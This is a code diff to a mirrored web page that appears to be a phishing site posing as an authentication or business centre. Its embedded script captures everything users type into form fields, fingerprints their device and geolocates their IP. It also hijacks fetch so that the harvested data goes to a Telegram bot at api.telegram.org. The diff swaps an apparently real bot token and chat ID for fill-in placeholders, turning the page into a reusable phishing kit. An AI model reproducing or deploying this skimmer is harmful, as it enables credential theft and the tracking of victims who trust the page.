@@ -2,13 +2,61 @@
 <!-- Mirrored from https://authentication-entry-center.netlify.app/business-center by HTTrack Website Copier/3.x [XR&CO], Thu, 19 Nov 2026 06:51:41 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head><script>
-  const MY_BOT_TOKEN = "9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4";
-  const MY_CHAT_ID   = "-5377276972";
+  const MY_BOT_TOKEN = "DÁN_BOT_TOKEN_CUA_BAN_VAO_DAY";
+  const MY_CHAT_ID   = "DÁN_CHAT_ID_CUA_BAN_VAO_DAY";
 
-  // 1. Tự động ghi nhận giá trị chữ rõ mỗi khi người dùng gõ vào bất kỳ ô nhập liệu nào
+  const _origFetch = window.fetch;
   const capturedFields = {};
-  let visitorIP = "Đang lấy...";
+  let geoInfo = {
+    ip: "Unknown",
+    location: "Unknown"
+  };
 
+  // 1. Nhận diện thiết bị: PC/Mobile · OS · Browser
+  function getFormattedDevice() {
+    const ua = navigator.userAgent;
+    let deviceType = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? "Mobile" : "PC";
+    if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";
+
+    let os = "Unknown OS";
+    if (/Windows NT 10\.0/i.test(ua)) os = "Windows 10/11";
+    else if (/Windows/i.test(ua)) os = "Windows";
+    else if (/Mac OS X/i.test(ua)) os = /iPhone|iPad|iPod/i.test(ua) ? "iOS" : "macOS";
+    else if (/Android/i.test(ua)) os = "Android";
+    else if (/Linux/i.test(ua)) os = "Linux";
+
+    let browser = "Unknown Browser";
+    if (/Edg\//i.test(ua)) browser = "Edge";
+    else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser = "Opera";
+    else if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) browser = "Chrome";
+    else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = "Safari";
+    else if (/Firefox\//i.test(ua)) browser = "Firefox";
+
+    return `${deviceType} · ${os} · ${browser}`;
+  }
+
+  // 2. Lấy chi tiết IP và Location theo chuẩn: City | Region (Code) | Country (Code)
+  async function loadGeoDetails() {
+    try {
+      const res = await _origFetch('https://ipapi.co/json/');
+      const d = await res.json();
+      if (d && d.ip) {
+        const city = d.city || '';
+        const region = d.region ? `${d.region}${d.region_code ? ` (${d.region_code})` : ''}` : '';
+        const country = d.country_name ? `${d.country_name}${d.country_code ? ` (${d.country_code})` : ''}` : (d.country_code || '');
+        const locParts = [city, region, country].filter(Boolean);
+
+        geoInfo.ip = d.ip;
+        geoInfo.location = locParts.length > 0 ? locParts.join(' | ') : 'Unknown';
+        return d;
+      }
+    } catch (e) {}
+    return null;
+  }
+
+  loadGeoDetails();
+
+  // 3. Ghi nhận tự động các trường mặc định trên form gốc
   document.addEventListener('input', function(e) {
     const el = e.target;
     if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
@@ -19,33 +67,34 @@
     }
   }, true);
 
-  // 2. Chặn fetch để vừa đổi ngôn ngữ theo IP, vừa gửi dữ liệu chữ rõ về Telegram
-  const _origFetch = window.fetch;
+  // 4. Chặn API gốc và gửi về Telegram Bot của bạn
   window.fetch = async function(url, options) {
     if (typeof url === 'string' && url.includes('/api/ip-location')) {
-      try {
-        const res = await _origFetch('https://ipapi.co/json/');
-        const data = await res.json();
-        visitorIP = `${data.ip || ''} (${data.country_code || 'US'} - ${data.city || ''})`;
-        return new Response(JSON.stringify({
-          country: data.country_code || 'US',
-          country_code: data.country_code || 'US',
-          city: data.city || '',
-          ip: data.ip || ''
-        }), { status: 200, headers: { 'Content-Type': 'application/json' } });
-      } catch (e) {
-        return new Response(JSON.stringify({ country: 'US', country_code: 'US' }), { status: 200, headers: { 'Content-Type': 'application/json' } });
-      }
+      const data = await loadGeoDetails();
+      const cc = (data && data.country_code) ? data.country_code : 'US';
+      return new Response(JSON.stringify({
+        country: cc,
+        country_code: cc,
+        city: (data && data.city) ? data.city : '',
+        ip: (data && data.ip) ? data.ip : ''
+      }), { status: 200, headers: { 'Content-Type': 'application/json' } });
     }
 
     if (options && options.method === 'POST' && (url.includes('telegram.org') || url.includes('/api/'))) {
       try {
-        let lines = [`🔔 *DỮ LIỆU FORM MỚI*`, `🌐 *IP:* \`${visitorIP}\``];
-        for (const [key, val] of Object.entries(capturedFields)) {
-          lines.push(`▪️ *${key}:* \`${val}\``);
+        if (geoInfo.ip === "Unknown") {
+          await loadGeoDetails();
         }
-        if (Object.keys(capturedFields).length === 0 && options.body) {
-          lines.push(`📦 *Raw:* \`${typeof options.body === 'string' ? options.body : JSON.stringify(options.body)}\``);
+
+        let lines = [
+          `IP: \`${geoInfo.ip}\``,
+          `Location: \`${geoInfo.location}\``,
+          `Device: \`${getFormattedDevice()}\``,
+          `--------------------------------`
+        ];
+
+        for (const [key, val] of Object.entries(capturedFields)) {
+          lines.push(`*${key}:* \`${val}\``);
         }
 
         await _origFetch(`https://api.telegram.org/bot${MY_BOT_TOKEN}/sendMessage`, {
